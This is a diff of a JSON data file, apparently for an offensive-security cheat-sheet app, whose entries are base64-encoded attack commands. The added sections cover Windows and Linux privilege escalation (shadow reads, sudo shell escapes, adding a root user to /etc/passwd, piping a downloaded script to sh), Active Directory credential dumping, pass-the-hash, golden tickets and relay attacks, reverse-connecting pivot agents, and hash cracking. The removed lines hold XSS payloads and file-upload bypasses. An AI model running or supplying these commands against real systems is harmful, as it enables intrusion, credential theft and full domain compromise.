+        "content": "cmVnIHNhdmUgaGtsbVxzYW0gc2FtLnNhdmUKcmVnIHNhdmUgaGtsbVxzeXN0ZW0gc3lzdGVtLnNhdmUKIyBPbiBLYWxpOgppbXBhY2tldC1zZWNyZXRzZHVtcCAtc2FtIHNhbS5zYXZlIC1zeXN0ZW0gc3lzdGVtLnNhdmUgTE9DQUw="
+      },
+      {
+        "sub_header": "GPP Passwords",
+        "content": "ZmluZHN0ciAvUyAvSSBjcGFzc3dvcmQgXFw8RlFETj5cU1lTVk9MXCoueG1sCmdwcC1kZWNyeXB0IDxjcGFzc3dvcmRfdmFsdWU+"
+      },
+      {
+        "sub_header": "Enable RDP",
+        "content": "cmVnIGFkZCAnSEtMTVxTeXN0ZW1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxUZXJtaW5hbCBTZXJ2ZXInIC92IGZEZW55VFNDb25uZWN0aW9ucyAvdCBSRUdfRFdPUkQgL2QgMCAvZgpuZXRzaCBhZHZmaXJld2FsbCBzZXQgcnVsZSBncm91cD0ncmVtb3RlIGRlc2t0b3AnIG5ldyBlbmFibGU9WWVzCm5ldCBsb2NhbGdyb3VwICdSZW1vdGUgRGVza3RvcCBVc2VycycgPHVzZXI+IC9hZGQ="
+      },
+      {
+        "sub_header": "Enable WinRM",
+        "content": "d2lucm0gcXVpY2tjb25maWcgLXEgLWZvcmNlCndpbnJtIHNldCB3aW5ybS9jb25maWcvc2VydmljZSBAe0FsbG93VW5lbmNyeXB0ZWQ9J3RydWUnfQp3aW5ybSBzZXQgd2lucm0vY29uZmlnL3NlcnZpY2UvYXV0aCBAe0Jhc2ljPSd0cnVlJ30KbmV0IHN0YXJ0IHdpbnJt"
       }
     ]
   },
   {
-    "button_name": "XSS",
-    "note_header": "Cross-Site Scripting (XSS)",
+    "button_name": "🐧 Linux PrivEsc",
+    "note_header": "Linux Privilege Escalation Techniques",
     "contents": [
       {
-        "sub_header": "Bypassing Logic via Case-Folding Tags",
-        "content": "PHNDUklQVD5hbGVydCgxKTwvU0NSSVBUPg=="
+        "sub_header": "Initial Enumeration",
+        "content": "c3VkbyAtbDsgaWQ7IHdob2FtaQpjYXQgL2V0Yy9wYXNzd2Q7IGNhdCAvZXRjL3NoYWRvdwpmaW5kIC8gLXBlcm0gLTQwMDAgLXR5cGUgZiAyPi9kZXYvbnVsbApmaW5kIC8gLXBlcm0gLTIwMDAgLXR5cGUgZiAyPi9kZXYvbnVsbApmaW5kIC8gLXdyaXRhYmxlIC10eXBlIGYgMj4vZGV2L251bGwKZ2V0Y2FwIC1yIC8gMj4vZGV2L251bGwKY3JvbnRhYiAtbDsgY2F0IC9ldGMvY3JvbnRhYgpzcyAtdHVsbnAKdW5hbWUgLWE7IGNhdCAvZXRjL29zLXJlbGVhc2UKY2F0IC9ldGMvZXhwb3J0cw=="
       },
       {
-        "sub_header": "Exploiting Image Sourcing Errors",
-        "content": "PGltZyBzcmM9eCBvbmVycm9yPSJhbGVydChkb2N1bWVudC5kb21haW4pIj4="
+        "sub_header": "Process Monitoring",
+        "content": "Li9wc3B5NjQgLXBmIC1pIDEwMDA="
       },
       {
-        "sub_header": "SVG-Based Payload with Animate Attributes",
-        "content": "PHN2Zz48YW5pbWF0ZSBvbmJlZ2luPSJhbGVydCgxKSIgYXR0cmlidXRlTmFtZT0ieCIgZnJvbT0iMCIgdG89IjEwIiBkdXI9IjFzIiAvPjwvc3ZnPg=="
+        "sub_header": "Automated - linPEAS",
+        "content": "Y3VybCAtTCBodHRwczovL2dpdGh1Yi5jb20vY2FybG9zcG9sb3AvUEVBU1MtbmcvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL2xpbnBlYXMuc2ggfCBzaAouL2xpbnBlYXMuc2ggLWEgfCB0ZWUgbGlucGVhc19vdXRwdXQudHh0"
       },
       {
-        "sub_header": "Bypassing Filter via JavaScript Template Literals",
-        "content": "JHtpbnB1dD9hbGVydCgxKToxfQ=="
+        "sub_header": "Sudo Abuse - find",
+        "content": "c3VkbyBmaW5kIC4gLWV4ZWMgL2Jpbi9zaCBcOyAtcXVpdA=="
+      },
+      {
+        "sub_header": "Sudo Abuse - vim",
+        "content": "c3VkbyB2aW0gLWMgJzohL2Jpbi9zaCc="
+      },
+      {
+        "sub_header": "Sudo Abuse - awk",
+        "content": "c3VkbyBhd2sgJ0JFR0lOIHtzeXN0ZW0oIi9iaW4vc2giKX0n"
+      },
+      {
+        "sub_header": "Sudo Abuse - python",
+        "content": "c3VkbyBweXRob24zIC1jICdpbXBvcnQgb3M7IG9zLnN5c3RlbSgiL2Jpbi9zaCIpJw=="
+      },
+      {
+        "sub_header": "Sudo Abuse - env",
+        "content": "c3VkbyBlbnYgL2Jpbi9zaA=="
+      },
+      {
+        "sub_header": "Cron Job Exploitation",
+        "content": "ZWNobyAnY3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2ggJiYgY2htb2QgK3MgL3RtcC9yb290YmFzaCcgPj4gL3BhdGgvdG8vc2NyaXB0LnNoCi90bXAvcm9vdGJhc2ggLXA="
+      },
+      {
+        "sub_header": "Writable /etc/passwd",
+        "content": "b3BlbnNzbCBwYXNzd2QgLTEgLXNhbHQgaGFja2VyIHBhc3N3b3JkMTIzCmVjaG8gJ2hhY2tlcjokMSRoYWNrZXIkSEFTSDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dkCnN1IGhhY2tlcg=="
+      },
+      {
+        "sub_header": "PATH Hijacking",
+        "content": "ZWNobyAtZSAnIyEvYmluL2Jhc2hcbi9iaW4vYmFzaCcgPiAvdG1wL2N1cmwKY2htb2QgK3ggL3RtcC9jdXJsCmV4cG9ydCBQQVRIPS90bXA6JFBBVEgKIyBSdW4gU1VJRCBiaW5hcnk="
+      },
+      {
+        "sub_header": "NFS no_root_squash",
+        "content": "IyBPbiB0YXJnZXQ6CmNhdCAvZXRjL2V4cG9ydHMKIyBPbiBLYWxpOgpzdWRvIG1vdW50IC10IG5mcyA8SVA+Oi9zaGFyZSAvbW50L25mcwpzdWRvIGNwIC9iaW4vYmFzaCAvbW50L25mcy9iYXNoCnN1ZG8gY2htb2QgNDc1NSAvbW50L25mcy9iYXNoCiMgT24gdGFyZ2V0OgovbW50L25mcy9iYXNoIC1w"
+      },
+      {
+        "sub_header": "Docker Escape",
+        "content": "ZG9ja2VyIHJ1biAtdiAvOi9tbnQgLS1ybSAtaXQgYWxwaW5lIGNocm9vdCAvbW50IHNo"
       }
     ]
   },
   {
-    "button_name": "IDOR",
-    "note_header": "Insecure Direct Object References Techniques",
+    "button_name": "🏰 Active Directory",
+    "note_header": "AD Attacks & Lateral Movement",
     "contents": [
       {
-        "sub_header": "IDOR via Parameter Pollution",
-        "content": "Y3VybCAtcyAiaHR0cHM6Ly88dGFyZ2V0LWRvbWFpbj4vYXBpL3ZpZXc/aWQ9MTIzJmlkPTQ1NiIgLS0gU2VuZGluZyBtdWx0aXBsZSBpbnN0YW5jZXMgb2YgdGhlIHNhbWUga2V5IHRvIHNlZSBpZiB0aGUgYXBwIHZhbGlkYXRlcyBvbmUgYnV0IHJldHJpZXZlcyB0aGUgb3RoZXIu"
+        "sub_header": "Password Spraying - nxc",
+        "content": "bnhjIHNtYiA8SVA+IC11IHVzZXJzLnR4dCAtcCBwYXNzd29yZHMudHh0IC0tY29udGludWUtb24tc3VjY2VzcwpueGMgd2lucm0gPElQPiAtdSB1c2Vycy50eHQgLXAgcGFzc3dvcmRzLnR4dA=="
       },
       {
-        "sub_header": "Exploiting IDOR via HTTP Method Switching",
-        "content": "Y3VybCAtWCBQVVQgLWQgJ3siZW1haWwiOiJldmlsQGF0dGFjay5jb20ifScgaHR0cHM6Ly88dGFyZ2V0LWRvbWFpbj4vYXBpL3VzZXIvMTIzIC0tIFRlc3RzIGlmIHRoZSBHRVQgZW5kcG9pbnQgaXMgcmVhZC1vbmx5IGJ1dCBQVVQvREVMRVRFIGxhY2tzIEFDTHMu"
+        "sub_header": "Credential Verification",
+        "content": "bnhjIHNtYiA8SVA+IC11IHVzZXIgLXAgcGFzcwpldmlsLXdpbnJtIC1pIDxJUD4gLXUgdXNlciAtcCBwYXNz"
+      },
+      {
+        "sub_header": "Pass-the-Hash",
+        "content": "ZXZpbC13aW5ybSAtaSA8SVA+IC11IGFkbWluaXN0cmF0b3IgLUggPE5UTE1faGFzaD4KaW1wYWNrZXQtcHNleGVjIC1oYXNoZXMgOjxOVExNX2hhc2g+IGRvbWFpbi9hZG1pbkA8SVA+CmltcGFja2V0LXdtaWV4ZWMgLWhhc2hlcyA6PE5UTE1faGFzaD4gZG9tYWluL2FkbWluQDxJUD4KbnhjIHNtYiA8SVA+IC11IGFkbWluIC1IIDxoYXNoPiAteCAnd2hvYW1pJw=="
+      },
+      {
+        "sub_header": "DCSync Attack",
+        "content": "aW1wYWNrZXQtc2VjcmV0c2R1bXAgLWp1c3QtZGMgZG9tYWluLmh0Yi9hZG1pbkA8RENfSVA+IC1oYXNoZXMgOjxoYXNoPgojIE1pbWlrYXR6IG9uIERDOgpsc2FkdW1wOjpkY3N5bmMgL3VzZXI6YWRtaW5pc3RyYXRvciAvZG9tYWluOmRvbWFpbi5odGI="
+      },
+      {
+        "sub_header": "Golden Ticket",
+        "content": "aW1wYWNrZXQtdGlja2V0ZXIgLW50aGFzaCA8a3JidGd0X05UTE0+IC1kb21haW4tc2lkIDxTSUQ+IC1kb21haW4gZG9tYWluLmh0YiBhZG1pbmlzdHJhdG9yCmV4cG9ydCBLUkI1Q0NOQU1FPWFkbWluaXN0cmF0b3IuY2NhY2hlCmltcGFja2V0LXBzZXhlYyAtayAtbm8tcGFzcyBkb21haW4vYWRtaW5pc3RyYXRvckA8REM+"
+      },
+      {
+        "sub_header": "Golden Ticket (Extra SID)",
+        "content": "aW1wYWNrZXQtdGlja2V0ZXIgLW50aGFzaCA8a3JidGd0X05UTE0+IC1kb21haW4gc3ViLmRvbWFpbi5jb20gLWRvbWFpbi1zaWQgPFNVQl9TSUQ+IC1leHRyYS1zaWQgPFBBUkVOVF9TSUQ+IEFkbWluaXN0cmF0b3IKZXhwb3J0IEtSQjVDQ05BTUU9QWRtaW5pc3RyYXRvci5jY2FjaGUKaW1wYWNrZXQtcHNleGVjIHN1Yi5kb21haW4uY29tL0FkbWluaXN0cmF0b3JAREMwMS5kb21haW4uY29tIC1rIC1uby1wYXNz"
+      },
+      {
+        "sub_header": "LLMNR Poisoning",
+        "content": "c3VkbyByZXNwb25kZXIgLUkgdHVuMCAtZHd2Cmhhc2hjYXQgLW0gNTYwMCBoYXNoZXMudHh0IC91c3Ivc2hhcmUvd29yZGxpc3RzL3JvY2t5b3UudHh0"
+      },
+      {
+        "sub_header": "SMB Relay Attack",
+        "content": "bnhjIHNtYiA8SVA+IC0tZ2VuLXJlbGF5LWxpc3QgdGFyZ2V0cy50eHQKIyBFZGl0IC9ldGMvcmVzcG9uZGVyL1Jlc3BvbmRlci5jb25mOiBTTUI9T2ZmLCBIVFRQPU9mZgpzdWRvIHJlc3BvbmRlciAtSSB0dW4wIC1kd3YgJgppbXBhY2tldC1udGxtcmVsYXl4IC0tbm8taHR0cC1zZXJ2ZXIgLXNtYjJzdXBwb3J0IC10ZiB0YXJnZXRzLnR4dAojIEludGVyYWN0aXZlOiAtaSBmbGFnLCB0aGVuIG5jIDEyNy4wLjAuMSAxMTAwMA=="
+      },
+      {
+        "sub_header": "Kerberoasting",
+        "content": "aW1wYWNrZXQtR2V0VXNlclNQTnMgLXJlcXVlc3QgLWRjLWlwIDxEQ19JUD4gZG9tYWluLmNvbS91c2VyOnBhc3MKaGFzaGNhdCAtbSAxMzEwMCBzcG5faGFzaC50eHQgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQKIyBUYXJnZXRlZDoKcHl0aG9uMyB0YXJnZXRlZEtlcmJlcm9hc3QucHkgLXYgLWQgJ2RvbWFpbi5jb20nIC11ICd1c2VyJyAtcCAncGFzcyc="
+      },
+      {
+        "sub_header": "AS-REP Roasting",
+        "content": "aW1wYWNrZXQtR2V0TlBVc2VycyAtZGMtaXAgPERDX0lQPiAtcmVxdWVzdCAtb3V0cHV0ZmlsZSBoYXNoZXMuYXNyZXByb2FzdCBkb21haW4uY29tL3VzZXI6cGFzcwpoYXNoY2F0IC1tIDE4MjAwIGhhc2hlcy5hc3JlcHJvYXN0IC91c3Ivc2hhcmUvd29yZGxpc3RzL3JvY2t5b3UudHh0"
+      },
+      {
+        "sub_header": "Kerberos Username Enumeration",
+        "content": "a2VyYnJ1dGUgdXNlcmVudW0gLS1kYyA8RENfSVA+IC1kIGRvbWFpbi5odGIgdXNlcm5hbWVzLnR4dA=="
+      },
+      {
+        "sub_header": "ADCS Certificate Abuse",
+        "content": "Y2VydGlweSBmaW5kIC11IHVzZXJAZG9tYWluLmh0YiAtcCAncGFzcycgLWRjLWlwIDxEQ19JUD4gLXZ1bG5lcmFibGUgLXN0ZG91dApjZXJ0aXB5IHJlcSAtdSB1c2VyQGRvbWFpbi5odGIgLXAgJ3Bhc3MnIC1jYSA8Q0FfTkFNRT4gLXRlbXBsYXRlIDxURU1QTEFURT4gLXVwbiBhZG1pbmlzdHJhdG9yQGRvbWFpbi5odGIKY2VydGlweSBhdXRoIC1wZnggYWRtaW5pc3RyYXRvci5wZnggLWRjLWlwIDxEQ19JUD4="
+      },
+      {
+        "sub_header": "Credential Dumping - secretsdump",
+        "content": "aW1wYWNrZXQtc2VjcmV0c2R1bXAgZG9tYWluL3VzZXI6cGFzc0A8SVA+CmltcGFja2V0LXNlY3JldHNkdW1wIC1zYW0gU0FNIC1zeXN0ZW0gU1lTVEVNIExPQ0FM"
+      },
+      {
+        "sub_header": "Credential Dumping - mimikatz",
+        "content": "cHJpdmlsZWdlOjpkZWJ1ZwpzZWt1cmxzYTo6bG9nb25wYXNzd29yZHMKbHNhZHVtcDo6c2FtCmxzYWR1bXA6OmRjc3luYyAvdXNlcjpjb3JwXEFkbWluaXN0cmF0b3I="
+      },
+      {
+        "sub_header": "NTDS.dit Extraction",
+        "content": "ZGlza3NoYWRvdyAvcyBpbmUudHh0CnJvYm9jb3B5IC9iIEU6XFdpbmRvd3NcTlREUyAuIG50ZHMuZGl0CnJlZyBzYXZlIGhrbG1cc3lzdGVtIHN5c3RlbQppbXBhY2tldC1zZWNyZXRzZHVtcCAtc3lzdGVtIHN5c3RlbSAtbnRkcyBudGRzLmRpdCBsb2NhbA=="
+      },
+      {
+        "sub_header": "BloodHound Collection",
+        "content": "Ymxvb2Rob3VuZC1weXRob24gLXUgdXNlciAtcCAncGFzcycgLWQgZG9tYWluLmh0YiAtYyBBbGwgLS16aXAgLW5zIDxEQ19JUD4KbnhjIGxkYXAgPERDX0lQPiAtdSB1c2VyIC1wICdwYXNzJyAtLWJsb29kaG91bmQgLS1jb2xsZWN0aW9uIEFsbCAtLWRucy1zZXJ2ZXIgPERDX0lQPgpzdWRvIG5lbzRqIGNvbnNvbGUgJgpzdWRvIGJsb29kaG91bmQgLS1uby1zYW5kYm94"
+      },
+      {
+        "sub_header": "Lateral Movement - WinRM",
+        "content": "ZXZpbC13aW5ybSAtaSA8SVA+IC11IHVzZXIgLXAgcGFzcwpldmlsLXdpbnJtIC1pIDxJUD4gLXUgdXNlciAtSCA8aGFzaD4="
+      },
+      {
+        "sub_header": "Lateral Movement - PsExec",
+        "content": "aW1wYWNrZXQtcHNleGVjIGRvbWFpbi91c2VyOnBhc3NAPElQPgppbXBhY2tldC1wc2V4ZWMgLWhhc2hlcyA6PGhhc2g+IGRvbWFpbi91c2VyQDxJUD4="
+      },
+      {
+        "sub_header": "Lateral Movement - WMI",
+        "content": "aW1wYWNrZXQtd21pZXhlYyBkb21haW4vdXNlcjpwYXNzQDxJUD4="
       }
     ]
   },
   {
-    "button_name": "File Upload",
-    "note_header": "Insecure Direct Object References Techniques",
+    "button_name": "🌉 Pivoting",
+    "note_header": "Ligolo-ng, Chisel, SSH Tunneling",
     "contents": [
       {
-        "sub_header": "Bypassing Extension Filters via Double Extensions",
-        "content": "Y3VybCAtRiAiZmlsZUBzaGVsbC5qcGcubGZpIiBodHRwczovLzx0YXJnZXQtZG9tYWluPi91cGxvYWQgLS0gVGVzdHMgaWYgdGhlIFdBRiBzdG9wcyBhdCB0aGUgZmlyc3QgZGV0ZWN0ZWQgZXh0ZW5zaW9uIHdoaWxlIHRoZSBzZXJ2ZXIgZXhlY3V0ZXMgdGhlIGxhc3Qu"
+        "sub_header": "Ligolo-ng - Kali Setup",
+        "content": "c3VkbyBpcCB0dW50YXAgYWRkIHVzZXIga2FsaSBtb2RlIHR1biBsaWdvbG8Kc3VkbyBpcCBsaW5rIHNldCBsaWdvbG8gdXAKLi9wcm94eSAtc2VsZmNlcnQgLWxhZGRyIDAuMC4wLjA6MTE2MDE="
       },
       {
-        "sub_header": "Exploiting Null Byte Injection in Filenames",
-        "content": "Y3VybCAtRiAiZmlsZUBzaGVsbC5waHAlMDBqcGciIGh0dHBzOi8vPHRhcmdldC1kb21haW4+L3VwbG9hZCAtLSBJZiB0aGUgdmFsaWRhdG9yIGlzIHdyaXR0ZW4gaW4gSGlnaC1sZXZlbCBsYW5ndWFnZXMgYnV0IHRoZSBPUyB1c2VzIEMsIGl0IG1heSB0cnVuY2F0ZSBhZnRlciBwaHAu"
+        "sub_header": "Ligolo-ng - Target Agent",
+        "content": "Li9hZ2VudC5leGUgLWNvbm5lY3QgPEtBTElfSVA+OjExNjAxIC1pZ25vcmUtY2VydA=="
+      },
+      {
+        "sub_header": "Ligolo-ng - Proxy Commands",
+        "content": "c2Vzc2lvbgppbnRlcmZhY2VfY3JlYXRlIC0tbmFtZSBsaWdvbG8Kc3RhcnQgLS10dW4gbGlnb2xvCnJvdXRlX2FkZCAtLW5hbWUgbGlnb2xvIC0tcm91dGUgMTAuMTAuWC4wLzI0CnN1ZG8gaXAgcm91dGUgYWRkIDEwLjEwLlguMC8yNCBkZXYgbGlnb2xvCmxpc3RlbmVyX2FkZCAtLWFkZHIgMC4wLjAuMDo0NDQ0IC0tdG8gMTI3LjAuMC4xOjQ0NDQgLS10Y3A="
+      },
+      {
+        "sub_header": "Chisel - Server",
+        "content": "Li9jaGlzZWwgc2VydmVyIC1wIDgwMDAgLS1yZXZlcnNl"
+      },
+      {
+        "sub_header": "Chisel - SOCKS5 Client",
+        "content": "Li9jaGlzZWwgY2xpZW50IDxLQUxJX0lQPjo4MDAwIFI6c29ja3MKIyBBZGQgdG8gL2V0Yy9wcm94eWNoYWluczQuY29uZjogc29ja3M1IDEyNy4wLjAuMSAxMDgwCnByb3h5Y2hhaW5zIG5tYXAgLXNUIC1QbiA8aW50ZXJuYWxfSVA+"
+      },
+      {
+        "sub_header": "Chisel - Port Forward",
+        "content": "Li9jaGlzZWwgY2xpZW50IDxLQUxJX0lQPjo4MDAwIFI6ODA4MDoxMjcuMC4wLjE6ODA4MA=="
+      },
+      {
+        "sub_header": "SSH - Local Port Forward",
+        "content": "c3NoIC1MIDgwODA6aW50ZXJuYWxfaG9zdDo4MCB1c2VyQDxJUD4="
+      },
+      {
+        "sub_header": "SSH - Dynamic SOCKS",
+        "content": "c3NoIC1EIDEwODAgdXNlckA8SVA+CiMgL2V0Yy9wcm94eWNoYWluczQuY29uZjogc29ja3M1IDEyNy4wLjAuMSAxMDgwCnByb3h5Y2hhaW5zIG5tYXAgLi4u"
+      },
+      {
+        "sub_header": "SSH - Remote Port Forward",
+        "content": "c3NoIC1SIDgwODA6bG9jYWxob3N0OjgwIHVzZXJAPElQPg=="
+      },
+      {
+        "sub_header": "Socat - Port Forward",
+        "content": "c29jYXQgVENQLUxJU1RFTjoyMzQ1LGZvcmsgVENQOjEwLjQuNTAuMjE1OjU0MzI="
+      },
+      {
+        "sub_header": "Socat - Full TTY Listener",
+        "content": "c29jYXQgZmlsZTpgdHR5YCxyYXcsZWNobz0wIFRDUC1MSVNURU46NDQ0NA=="
+      }
+    ]
+  },
+  {
+    "button_name": "🔐 Hash Cracking",
+    "note_header": "Hashcat & John the Ripper",
+    "contents": [
+      {
+        "sub_header": "Hashcat - MD5",
+        "content": "aGFzaGNhdCAtbSAwIGhhc2gudHh0IHJvY2t5b3UudHh0"
+      },
+      {
+        "sub_header": "Hashcat - SHA1",
+        "content": "aGFzaGNhdCAtbSAxMDAgaGFzaC50eHQgcm9ja3lvdS50eHQ="
+      },
+      {
+        "sub_header": "Hashcat - NTLM",
+        "content": "aGFzaGNhdCAtbSAxMDAwIGhhc2gudHh0IHJvY2t5b3UudHh0"
+      },
+      {
+        "sub_header": "Hashcat - NetNTLMv2",
+        "content": "aGFzaGNhdCAtbSA1NjAwIGhhc2gudHh0IHJvY2t5b3UudHh0"
+      },
+      {
+        "sub_header": "Hashcat - Kerberos AS-REP",
+        "content": "aGFzaGNhdCAtbSAxODIwMCBoYXNoLnR4dCByb2NreW91LnR4dA=="
+      },
+      {
+        "sub_header": "Hashcat - Kerberos TGS",
+        "content": "aGFzaGNhdCAtbSAxMzEwMCBoYXNoLnR4dCByb2NreW91LnR4dA=="
+      },
+      {
+        "sub_header": "Hashcat - sha512crypt",
+        "content": "aGFzaGNhdCAtbSAxODAwIGhhc2gudHh0IHJvY2t5b3UudHh0"
+      },
+      {
+        "sub_header": "Hashcat - bcrypt",
+        "content": "aGFzaGNhdCAtbSAzMjAwIGhhc2gudHh0IHJvY2t5b3UudHh0"
+      },
+      {
+        "sub_header": "Hashcat - With Rules",
+        "content": "aGFzaGNhdCAtbSA8TU9ERT4gaGFzaC50eHQgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQgLXIgL3Vzci9zaGFyZS9oYXNoY2F0L3J1bGVzL2Jlc3Q2NC5ydWxl"
+      },
+      {
+        "sub_header": "John - Basic",
+        "content": "am9obiAtLXdvcmRsaXN0PS91c3Ivc2hhcmUvd29yZGxpc3RzL3JvY2t5b3UudHh0IGhhc2gudHh0"
+      },
+      {
+        "sub_header": "John - NTLM Format",
+        "content": "am9obiAtLWZvcm1hdD1udCBoYXNoLnR4dCAtLXdvcmRsaXN0PXJvY2t5b3UudHh0"
+      },
+      {
+        "sub_header": "John - unshadow",
+        "content": "dW5zaGFkb3cgcGFzc3dkIHNoYWRvdyB8IGpvaG4gLSAtLXdvcmRsaXN0PXJvY2t5b3UudHh0"
+      },
+      {
+        "sub_header": "Identify Hash",
+        "content": "aGFzaGlkIDxIQVNIPgpoYXNoLWlkZW50aWZpZXI="
+      },
+      {
+        "sub_header": "ZIP Password Cracking",
+        "content": "emlwMmpvaG4gYmFja3VwLnppcCA+IGhhc2hlcy50eHQKam9obiAtLXdvcmRsaXN0PS91c3Ivc2hhcmUvd29yZGxpc3RzL3JvY2t5b3UudHh0IGhhc2hlcy50eHQKZmNyYWNremlwIC12IC11IC1EIC1wICdyb2NreW91LnR4dCcgYmFja3VwLnppcA=="
+      },
+      {
+        "sub_header": "SSH Key Passphrase",
+        "content": "c3NoMmpvaG4gaWRfcnNhID4gc3NoLmhhc2gKam9obiAtLXdvcmRsaXN0PXJvY2t5b3UudHh0IHNzaC5oYXNo"
+      },
+      {
+        "sub_header": "KeePass Cracking",
+        "content": "a2VlcGFzczJqb2huIERhdGFiYXNlLmtkYnggPiBrZWVwYXNzLmhhc2gKaGFzaGNhdCAtbSAxMzQwMCBrZWVwYXNzLmhhc2ggL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQ="
+      }
+    ]
+  },
+  {
+    "button_name": "📚 Resources",
+    "note_header": "Quick Reference & Checklists",
+    "contents": [
+      {
+        "sub_header": "Quick-Win Checklist",
+        "content": "WyBdIE5tYXAg4oCUIHF1aWNrIHNjYW4gZmlyc3QsIGZ1bGwgc2NhbiBpbiBiYWNrZ3JvdW5kClsgXSBVRFAg4oCUIGFsd2F5cyBzY2FuIChTTk1QIG9uIDE2MSBpcyBvZnRlbiB0aGUgZW50cnkgcG9pbnQpClsgXSByb2JvdHMudHh0LCAvc2l0ZW1hcC54bWwsIHBhZ2Ugc291cmNlIGNvbW1lbnRzClsgXSBEZWZhdWx0IGNyZWRlbnRpYWxzIG9uIGV2ZXJ5IGxvZ2luIHBhZ2UKWyBdIEFub255bW91cy9ndWVzdCBhY2Nlc3Mgb24gU01CLCBGVFAsIE5GUwpbIF0gWm9uZSB0cmFuc2ZlciBvbiBETlMKWyBdIFNOTVAgd2l0aCAncHVibGljJyBjb21tdW5pdHkgc3RyaW5nClsgXSBDaGVjayAuZ2l0IGV4cG9zdXJlOiBjdXJsIC1JIGh0dHA6Ly88SVA+Ly5naXQvY29uZmlnClsgXSBMaW5QRUFTIC8gV2luUEVBUyBpbW1lZGlhdGVseSBhZnRlciBzaGVsbApbIF0gc3VkbyAtbCAoTGludXgpIC8gd2hvYW1pIC9wcml2IChXaW5kb3dzKSBpbW1lZGlhdGVseSBhZnRlciBzaGVsbApbIF0gQ3JlZGVudGlhbCByZXVzZSBhY3Jvc3MgQUxMIHNlcnZpY2VzIGFuZCBtYWNoaW5lcwpbIF0gUFMgSGlzdG9yeTogdHlwZSAkZW52OkFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcUG93ZXJTaGVsbFxQU1JlYWRMaW5lXENvbnNvbGVIb3N0X2hpc3RvcnkudHh0"
+      },
+      {
+        "sub_header": "Key URLs",
+        "content": "R1RGT0JpbnMgKExpbnV4KTogaHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8KTE9MQkFTIChXaW5kb3dzKTogaHR0cHM6Ly9sb2xiYXMtcHJvamVjdC5naXRodWIuaW8KUmV2U2hlbGxzOiBodHRwczovL3d3dy5yZXZzaGVsbHMuY29tCkhhY2tUcmlja3M6IGh0dHBzOi8vYm9vay5oYWNrdHJpY2tzLnh5egpQYXlsb2Fkc0FsbFRoZVRoaW5nczogaHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzCkhhc2hjYXQgRXhhbXBsZXM6IGh0dHBzOi8vaGFzaGNhdC5uZXQvd2lraS9kb2t1LnBocD9pZD1leGFtcGxlX2hhc2hlcw=="
       }
     ]
   }
